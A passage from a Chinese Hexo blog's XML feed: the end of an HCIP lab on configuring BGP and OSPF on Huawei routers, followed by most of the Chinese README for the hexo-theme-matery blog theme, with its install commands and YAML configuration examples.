class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R3：</strong></p><pre class="line-numbers language-none"><code class="language-none">ospf 1 area 0.0.0.0 network 3.3.3.0 0.0.0.255 network 23.23.23.0 0.0.0.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2 . 保障R2与R3上回环口可ping通（打通IP网络）;</p><p><strong>R2:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 200peer 3.3.3.3 as-number 200 peer 3.3.3.3 connect-interface LoopBack 0peer 3.3.3.3 next-hop-local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R3:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 200peer 2.2.2.2 as-number 200 peer 2.2.2.2 connect-interface LoopBack 0peer 2.2.2.2 next-hop-local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R3、R4的EBGP："><a href="#配置R3、R4的EBGP：" class="headerlink" title="配置R3、R4的EBGP："></a>配置R3、R4的EBGP：</h5><p>1 . R4建立回环口，表示业务网络，</p> <pre class="line-numbers language-none"><code class="language-none">Interface loopback 0Ip add 4.4.4.4 24&#x2F;&#x2F;并在BGP300中公告；bgp 300network 4.4.4.0 24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2 . 采用回环口的形式建立EBGP的peer</p><p><strong>R4：</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 300peer 3.3.3.3 as-number 200 peer 3.3.3.3 ebgp-max-hop 7 &#x2F;&#x2F;解决EBGP的AS之间交换路由TTL&#x3D;1的问题；peer 3.3.3.3 connect-interface LoopBack 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本实验，EBGP采用回环建立Peer。但一般情况下，EBGP邻居采用物理接口地址建立Peer。</p><p>   系统视图设置静态路由：</p><pre class="line-numbers language-none"><code class="language-none">ip route-static 3.3.3.3 255.255.255.255 34.34.34.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>//注意3.3.3.3为R3的回环口地址，掩码采用32位，目的是解决由EBGP300到200的路由公告中，若静态和BGP同时存在，BGP只选择静态路由，因静态优先级60，而BGP为255.使用32位掩码使得BGP的路由和静态路由成为两条不同路由同时存在。此时在R3或者R4上使用disp ip routing查看，其中关于4.4.4.0网络的IP路由表没有BGP的只有静态的</p><p>3 . 配置R3的回环EBGP</p><p><strong>R3：</strong></p><pre class="line-numbers language-none"><code class="language-none">peer 4.4.4.4 as-number 300 peer 4.4.4.4 ebgp-max-hop 7 peer 4.4.4.4 connect-interface LoopBack 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>系统视图：</p><pre class="line-numbers language-none"><code class="language-none">ip route-static 4.4.4.4 255.255.255.255 34.34.34.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时分别在AS100和AS300中查看路由表。Disp bgp routing-table</p><p>在R1进行 <font color="red">ping –a 1.1.1.1 4.4.4.4</font> 操作，如果能够ping通则说明实验实现成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;center&gt;&lt;h1&gt;外部网关路由协议 BGP&lt;/h1&gt;&lt;/center&gt;
[TOC]

&lt;h2 id=&quot;BGP概述&quot;&gt;&lt;a href=&quot;#BGP概述&quot; class=&quot;headerlink&quot; title=&quot;BGP概述&quot;&gt;&lt;/a&gt;BGP概述&lt;/h2&gt;&lt;p&gt;OSPF、IS-IS等I</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="BGP" scheme="https://shierjinghuang.github.io/tags/BGP/"/>
    
  </entry>
  
  <entry>
    <title>hexo-theme-matery</title>
    <link href="https://shierjinghuang.github.io/2023/03/30/README_CN/"/>
    <id>https://shierjinghuang.github.io/2023/03/30/README_CN/</id>
    <published>2023-03-29T23:58:35.000Z</published>
    <updated>2023-03-30T00:52:52.289Z</updated>
    
    <content type="html"><![CDATA[<h1><center>hexo-theme-matery</center></h1><p><a href="http://hits.dwyl.io/blinkfox/hexo-theme-matery"><img src="http://hits.dwyl.io/blinkfox/hexo-theme-matery.svg" alt="HitCount"></a> <a href="https://gitter.im/hexo-theme-matery/Lobby?utm_source=badge"><img src="https://img.shields.io/gitter/room/blinkfox/hexo-theme-matery.svg" alt="Gitter"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/issues"><img src="https://img.shields.io/github/issues/blinkfox/hexo-theme-matery.svg" alt="GitHub issues"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/blob/master/LICENSE"><img src="https://img.shields.io/github/license/blinkfox/hexo-theme-matery.svg" alt="GitHub license"></a> <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master"><img src="https://img.shields.io/badge/downloads-master-green.svg" alt="Download"></a> <a href="http://hexo.io/"><img src="https://img.shields.io/badge/hexo-%3E%3D%205.0.0-blue.svg" alt="Hexo Version"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/network"><img src="https://img.shields.io/github/forks/blinkfox/hexo-theme-matery.svg" alt="GitHub forks"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/stargazers"><img src="https://img.shields.io/github/stars/blinkfox/hexo-theme-matery.svg" alt="GitHub stars"></a></p><p><a href="README.md">🇺🇸English Document</a> | <a href="http://blinkfox.com/">国内访问示例 (http://blinkfox.com)</a> | <a href="https://blinkfox.github.io/">Github 部署演示示例 (https://blinkfox.github.io)</a> </p><p>QQ 交流群1（已满）: <a href="https://jq.qq.com/?_wv=1027&k=5zMDYHT"><code>926552981</code></a> | QQ 交流群2（已满）: <a href="https://jq.qq.com/?_wv=1027&k=53q2Ayp"><code>971887688</code></a> | QQ 交流群3（推荐）: <a href="https://qm.qq.com/cgi-bin/qm/qr?k=fC1-kU-_aTn4q-JQq4GsYKr4WcKdgfGa&jump_from=webapi"><code>670694035</code></a></p><blockquote><p>这是一个采用 <code>Material Design</code> 和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/">Gitalk</a>、<a href="https://imsun.github.io/gitment/">Gitment</a>、<a href="https://valine.js.org/">Valine</a> 和 <a href="https://disqus.com/">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li><li>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。</li><li>支持 <a href="http://www.daovoice.io/">DaoVoice</a>、<a href="https://www.tidio.com/">Tidio</a> 在线聊天功能。</li></ul><h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p>感谢下面列出的贡献者，没有他们，hexo-theme-matery 不会这么完美。</p><ul><li><a href="https://github.com/HarborZeng">@HarborZeng</a></li><li><a href="https://github.com/shw2018">@shw2018</a></li><li><a href="https://github.com/L1cardo">@L1cardo</a></li><li><a href="https://github.com/Five-great">@Five-great</a></li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>本主题<strong>推荐你使用 Hexo 5.0.0 及以上的版本</strong>。如果，你已经有一个自己的 <a href="https://hexo.io/zh-cn/">Hexo</a> 博客了，建议你将 Hexo 升级到最新稳定的版本。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>git clone</code> 命令来下载:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> categories<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> tags<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 18:23:38</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"about"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> about<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建留言板-contact-页（可选的）"><a href="#新建留言板-contact-页（可选的）" class="headerlink" title="新建留言板 contact 页（可选的）"></a>新建留言板 contact 页（可选的）</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"contact"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> contact<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p></blockquote><h3 id="新建友情链接-friends-页（可选的）"><a href="#新建友情链接-friends-页（可选的）" class="headerlink" title="新建友情链接 friends 页（可选的）"></a>新建友情链接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情链接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> friends<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-12-12 21:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"码酱"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://luokangyuan.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"闪烁之狐"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://blinkfox.github.io/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ja_rome"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://me.csdn.net/jlh912008548"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建-404-页"><a href="#新建-404-页" class="headerlink" title="新建 404 页"></a>新建 404 页</h3><p>如果在你的博客 <code>source</code> 目录下还没有 <code>404.md</code> 文件，那么你就需要新建一个</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/404/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token number">404</span><span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">description</span><span class="token punctuation">:</span> <span class="token string">"Oops～，我崩溃了！找不到你想要的页面 :("</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h3><h4 id="配置基本菜单导航的名称、路径url和图标icon"><a href="#配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="配置基本菜单导航的名称、路径url和图标icon."></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>)<br>2.图标icon 可以在<a href="https://fontawesome.com/icons">Font Awesome</a> 中查找   </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><ol><li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)     </li><li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.      </li><li>注意每个二级菜单模块前要加 <code>-</code>.     </li><li>注意缩进格式  </li></ol><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle<span class="token punctuation">-</span>o  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book  <span class="token key atrule">Medias</span><span class="token punctuation">:</span>    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>list    <span class="token key atrule">children</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Music        <span class="token key atrule">url</span><span class="token punctuation">:</span> /music        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>music      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Movies        <span class="token key atrule">url</span><span class="token punctuation">:</span> /movies        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>film      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Books        <span class="token key atrule">url</span><span class="token punctuation">:</span> /books        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>book      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Galleries        <span class="token key atrule">url</span><span class="token punctuation">:</span> /galleries        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>从 Hexo5.0 版本开始自带了 <code>prismjs</code> 代码语法高亮的支持，本主题对此进行了改造支持。</p><p>如果你的博客中曾经安装过 <code>hexo-prism-plugin</code> 的插件，那么你须要执行 <code>npm uninstall hexo-prism-plugin</code> 来卸载掉它，否则生成的代码中会有 <code>&amp;#123;</code> 和 <code>&amp;#125;</code> 的转义字符。</p><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并将 <code>prismjs.enable</code> 的值设置为 <code>true</code>，主要配置如下：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">highlight</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">auto_detect</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">tab_replace</span><span class="token punctuation">:</span> <span class="token string">''</span>  <span class="token key atrule">wrap</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">hljs</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">prismjs</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">preprocess</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">tab_replace</span><span class="token punctuation">:</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主题中默认的 <code>prismjs</code> 主题是 <code>Tomorrow Night</code>，如果你想定制自己的主题，可以前往 <a href="https://prismjs.com/download.html">prismjs 下载页面</a> 定制下载自己喜欢的主题 <code>css</code> 文件，然后将此 css 主题文件取名为 <code>prism.css</code>，替换掉 <code>hexo-theme-matery</code> 主题文件夹中的 <code>source/libs/prism/prism.css</code> 文件即可。</p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml  <span class="token key atrule">field</span><span class="token punctuation">:</span> post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="中文链接转拼音（建议安装）"><a href="#中文链接转拼音（建议安装）" class="headerlink" title="中文链接转拼音（建议安装）"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i hexo-permalink-pinyin --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">permalink_pinyin</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">separator</span><span class="token punctuation">:</span> <span class="token string">'-'</span> <span class="token comment"># default: '-'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（建议安装）"><a href="#文章字数统计插件（建议安装）" class="headerlink" title="文章字数统计插件（建议安装）"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 